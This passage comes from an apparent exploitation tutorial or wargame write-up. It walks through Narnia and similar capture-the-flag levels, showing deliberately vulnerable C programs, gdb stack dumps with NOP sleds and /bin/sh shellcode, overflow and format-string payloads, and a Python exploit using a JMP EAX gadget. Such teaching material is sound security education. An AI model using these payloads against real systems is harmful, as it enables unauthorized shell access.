0xffffd824: 0x00386169  0x41414141  0x41414141  0x41414141
0xffffd834: 0x41414141  0x41414141  0xffffd828  0x41414141
0xffffd844: 0x41414141  0x41414141  0x42424242  0x47445800
0xffffd854: 0x5345535f  0x4e4f4953  0x3d44495f  0x35343239
0xffffd864: 0x45485300  0x2f3d4c4c  0x2f6e6962  0x68736162
0xffffd874: 0x52455400  0x74783d4d  0x006d7265  0x5f485353
0xffffd884: 0x45494c43  0x353d544e  0x34392e39  0x2e31362e
0xffffd894: 0x20343731  0x37373835  0x32322032  0x48535300
0xffffd8a4: 0x5954545f  0x65642f3d  0x74702f76  0x31312f73
0xffffd8b4: 0x5f434c00  0x3d4c4c41  0x47450043  0x90903d47
0xffffd8c4: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd8d4: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd8e4: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd8f4: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd904: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd914: 0x90909090  0x90909090  0x99580b6a  0x2f2f6852
0xffffd924: 0x2f686873  0x896e6962  0xcdc931e3  0x53550080
0xffffd934: 0x6e3d5245  0x696e7261  0x4c003861  0x4f435f53
0xffffd944: 0x53524f4c  0x3d73723d  0x69643a30  0x3b31303d
</pre></div>
</div>
<p>Let’s redirect our program to 0xffffd8d4 to get the shell</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) run `python -c &#39;print &quot;A&quot;*20 + &quot;\x28\xd8\xff\xff&quot; + &quot;A&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia8 `python -c &#39;print &quot;A&quot;*20 + &quot;\x28\xd8\xff\xff&quot; + &quot;A&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;`

Breakpoint 1, 0x080484a7 in func ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA(���AAAAAAAAAAAA����(���
process 19900 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the &quot;file&quot; command.
Error in re-setting breakpoint 1: No symbol &quot;func&quot; in current context.
Error in re-setting breakpoint 1: No symbol &quot;func&quot; in current context.
Error in re-setting breakpoint 1: No symbol &quot;func&quot; in current context.
$
</pre></div>
</div>
<p>Trying this without gdb didn’t work because the address of character array changes</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20 + &quot;\x28\xd8\xff\xff&quot; + &quot;B&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;`
AAAAAAAAAAAAAAAAAAAA(A��
narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20 + &quot;\x28\xd8\xff\xff&quot; + &quot;B&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;` | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 4128 ffff 0a02
000001a
</pre></div>
</div>
<p>Changing 28 to 0a just by chance gave me the correct address to be pointed at</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20 + &quot;\x0a\xd8\xff\xff&quot; + &quot;B&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;` | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 d837 ffff 0a03
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20 + &quot;\x37\xd8\xff\xff&quot; + &quot;B&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;`
AAAAAAAAAAAAAAAAAAAA7���BBBBBBBBBBBB����7���
$
</pre></div>
</div>
<p>For example, below you need the address of secret to write the new value 0x1337beef.</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">unsigned</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xdeadbeef</span><span class="p">;</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">){</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">value</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">key</span><span class="p">[</span><span class="mi">33</span><span class="p">];</span>
<span class="w">    </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">f</span><span class="p">;</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome! I will grant you one arbitrary write!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Where do you want to write to? &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Okay! What do you want to write there? &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Writing %p to %p...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">);</span>
<span class="w">    </span><span class="o">*</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="p">;</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Value written!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">secret</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x1337beef</span><span class="p">){</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Woah! You changed my secret!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;I guess this means you get a flag now...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="w">        </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;flag.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">fgets</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span>
<span class="w">        </span><span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;My secret is still safe! Sorry.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can’t be printed as ASCII characters, you can use python to pass the input.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39; print &quot;A&quot; * 16 + &quot;</span><span class="se">\xc0\xde\xfa\xce</span><span class="s1">&quot;&#39;</span> <span class="ow">or</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39; print &quot;A&quot; * 16 + &quot;</span><span class="se">\xce\xfa\xde\xc0</span><span class="s1">&quot;&#39;</span> <span class="n">based</span> <span class="n">on</span> <span class="n">the</span> <span class="n">endianess</span> <span class="n">of</span> <span class="n">the</span> <span class="n">system</span><span class="o">.</span>
</pre></div>
</div>
<div class="highlight-C notranslate"><div class="highlight"><pre><span></span><span class="kt">void</span><span class="w"> </span><span class="nf">give_shell</span><span class="p">(){</span>
<span class="w">     </span><span class="n">gid</span><span class="err">\</span><span class="n">_t</span><span class="w"> </span><span class="n">gid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getegid</span><span class="p">();</span>
<span class="w">     </span><span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="w"> </span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">);</span>
<span class="w">     </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="err">\</span><span class="o">*</span><span class="n">input</span><span class="p">){</span>
<span class="w">     </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
<span class="w">     </span><span class="kt">int</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">     </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">input</span><span class="p">);</span>

<span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">secret</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xc0deface</span><span class="p">){</span>
<span class="w">     </span><span class="n">give_shell</span><span class="p">();</span>
<span class="w"> </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">     </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;The secret is %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">secret</span><span class="p">);</span>
<span class="w"> </span><span class="p">}</span>

<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="err">\</span><span class="o">*</span><span class="err">\</span><span class="o">*</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
<span class="w">     </span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">     </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Controlling the EIP: In the below challenge, an attacker can use a buffer overflow to take control of the program’s execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give_shell function.</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>We need to find the address of give_shell function which can be done either by using gdb and print give_shell or objdump -d outputfile | grep give_shell.</p></li>
<li><p>To know the EIP offset, you can use cyclic patterns. Use pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</p></li>
<li><p>Then you feed this as your input to the vulnerable program and it will crash. so get the value of EIP at that point.</p></li>
<li><p>Then, we just need to pass the input to the program by</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>./a.out $(python -c &#39; print &quot;A&quot; \* Offset + &quot;Address of give\_shell in hex&quot;&#39; )
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

/* This never gets called! */
void give_shell(){
     gid_t gid = getegid();
     setresgid(gid, gid, gid);
     system(&quot;/bin/sh -i&quot;);
}

void vuln(char *input){
     char buf[16];
     strcpy(buf, input);
}

int main(int argc, char **argv){
     if (argc &gt; 1)
        vuln(argv[1]);
        return 0;
}
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
<ul class="simple">
<li><p>Execute Me: If you check the below code, getegid() function shall return the effective group ID of the calling process., setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process. If you see, read function read the stdin into the buffer and (function_ptf) buf() function is called which would call anything in the buffer.</p></li>
</ul>
<blockquote>
<div><ul>
<li><p>Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on Shell-Storm.</p></li>
<li><p>Then, we just need to pass the input to the program by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>./a.out $(python -c &#39; print &quot;A&quot; \* Offset + &quot;Address of give\_shell in hex&quot;&#39; )
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>
<span class="c1">#include &lt;stdlib.h&gt;</span>

<span class="nb">int</span> <span class="n">token</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="n">typedef</span> <span class="n">void</span> <span class="p">(</span><span class="o">*</span><span class="n">function_ptr</span><span class="p">)();</span>

<span class="n">void</span> <span class="n">be_nice_to_people</span><span class="p">(){</span>
    <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
<span class="p">}</span>

<span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
         <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

         <span class="n">be_nice_to_people</span><span class="p">();</span>
         <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
         <span class="p">((</span><span class="n">function_ptr</span><span class="p">)</span><span class="n">buf</span><span class="p">)();</span>
 <span class="p">}</span>
</pre></div>
</div>
</li>
</ul>
</div></blockquote>
<ul class="simple">
<li><p>ROP1: This binary is running on a machine with ASLR! (Address space layout randomization (ASLR) is a computer security technique involved in protection from buffer overflow attacks.) Can you bypass it?</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>From the code provided we can see that there’s a buffer overflow in the vuln() function due to the strcpy() call. run the program within gdb and see what the state of the registers and the stack are at the time of the crash.</p></li>
<li><p>From the cylic patterns tools, we could find that offset is at 76 which could be confirmed by providing a input of 76 “A”s and 4 “B”s to overwrite EIP. set a breakpoint after the call to strcpy(); that is *vuln+24. After the leave instruction is executed, EIP will be set to 0x424242.</p></li>
<li><p>EAX points to our buffer of “A”s and since the binary doesn’t have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this:</p></li>
<li><p>Since the binary is compiled for 32 bit, searching the shellcode in Shellstorm for Linux_x86 executing /bin/sh, we get 21 bytes shellcode in kernelpanic.</p></li>
<li><p>As EAX contains the 76*A + BBBB when the vuln function returns, we just need to find address which will execute JMP EAX, it can be found by msfelfscan -j eax binary_file</p></li>
<li><p>One more small but important observation is the number of NOPs, as our shellcode is 21 bytes and offset is 76 bytes and jmp is 4 bytes. So, 76 - 21 - 4 = 51.</p></li>
</ul>
<blockquote>
<div><div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">struct</span>
<span class="n">code</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class="s2">&quot;</span>
<span class="n">jmpeax</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span><span class="mh">0x080483e7</span><span class="p">)</span>
<span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">51</span> <span class="o">+</span> <span class="n">code</span> <span class="o">+</span> <span class="n">jmpeax</span>
</pre></div>
</div>
<div class="highlight-C notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">be_nice_to_people</span><span class="p">(){</span>
<span class="w">     </span><span class="kt">gid_t</span><span class="w"> </span><span class="n">gid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getegid</span><span class="p">();</span>
<span class="w">     </span><span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="w"> </span><span class="n">gid</span><span class="p">,</span><span class="w"> </span><span class="n">gid</span><span class="p">);</span>
<span class="w"> </span><span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">){</span>
<span class="w">     </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
<span class="w">     </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">){</span>
<span class="w">    </span><span class="n">be_nice_to_people</span><span class="p">();</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
<span class="w">       </span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">       </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
</section>
<section id="format-string-examples">
<h3>Format String Examples<a class="headerlink" href="#format-string-examples" title="Link to this heading"></a></h3>
<p>Let’s see a simple example of a format string vulnerabilty.</p>
<ul class="simple">
<li><p>Narnia5</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="o">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="o">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="n">include</span> <span class="o">&lt;</span><span class="n">string</span><span class="o">.</span><span class="n">h</span><span class="o">&gt;</span>

<span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> \<span class="o">*</span>\<span class="o">*</span><span class="n">argv</span><span class="p">){</span>
     <span class="nb">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
     <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
     <span class="n">buffer</span><span class="p">[</span><span class="n">sizeof</span> <span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Change i&#39;s value from 1 -&gt; 500. &quot;</span><span class="p">);</span>

     <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">500</span><span class="p">){</span>
       <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;GOOD</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
       <span class="n">system</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">);</span>
     <span class="p">}</span>

     <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;No way...let me give you a hint!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
     <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;buffer : [</span><span class="si">%s</span><span class="s2">] (</span><span class="si">%d</span><span class="s2">)</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
     <span class="n">printf</span> <span class="p">(</span><span class="s2">&quot;i = </span><span class="si">%d</span><span class="s2"> (%p)</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">);</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Let’s try to see what’s on stack and if we can put something on stack and change the value of i.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia5@melinda:~$ /narnia/narnia5
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x Change i&#39;s value from 1 -&gt; 500.
No way...let me give you a hint! buffer :
[f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.62653766.36656436.6666662e.] (63) i
= 1 (0xffffd6cc)

      narnia5@melinda:~$ /narnia/narnia5
      AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x Change i&#39;s value from 1 -&gt;
      500. No way...let me give you a hint! buffer :
      [AAAAf7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.41414141.62653766.36656] (63) i
      = 1 (0xffffd6cc)

      narnia5@melinda:~$ /narnia/narnia5
      ``python -c &#39;print &quot;\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x&quot;&#39;``
      Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint! buffer
      : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.ffffd6cc.62653766.36656] (63)
      i = 1 (0xffffd6cc)

      narnia5@melinda:~$ /narnia/narnia5
      ``python -c &#39;print &quot;\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08n.%08x.%08x.%08x&quot;&#39;``
      Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint! buffer
      : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8..62653766.36656436.6666] (63)
      i = 40 (0xffffd6cc)

      narnia5@melinda:~$ /narnia/narnia5
      ``python -c &#39;print &quot;\xcc\xd6\xff\xff%08x.%08x.%08x.%468x.%08n.%08x.%08x.%08x&quot;&#39;``
      Change i&#39;s value from 1 -&gt; 500. GOOD $
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>In this example, let’s see use of arbitary writing an address Narnia7</p></li>
</ul>
<blockquote>
<div><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">goodfunction</span><span class="p">();</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">hackedfunction</span><span class="p">();</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">format</span><span class="p">){</span>
<span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">ptrf</span><span class="p">)();</span>

<span class="w">        </span><span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;goodfunction() = %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">goodfunction</span><span class="p">);</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;hackedfunction() = %p</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">hackedfunction</span><span class="p">);</span>

<span class="w">        </span><span class="n">ptrf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">goodfunction</span><span class="p">;</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;before : ptrf() = %p (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ptrf</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ptrf</span><span class="p">);</span>

<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;I guess you want to come to the hackedfunction...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<span class="w">        </span><span class="n">ptrf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">goodfunction</span><span class="p">;</span>

<span class="w">        </span><span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">format</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ptrf</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">){</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">1</span><span class="p">){</span>
<span class="w">                </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Usage: %s &lt;buffer&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">                </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">goodfunction</span><span class="p">(){</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome to the goodfunction, but i said the Hackedfunction..</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">hackedfunction</span><span class="p">(){</span>
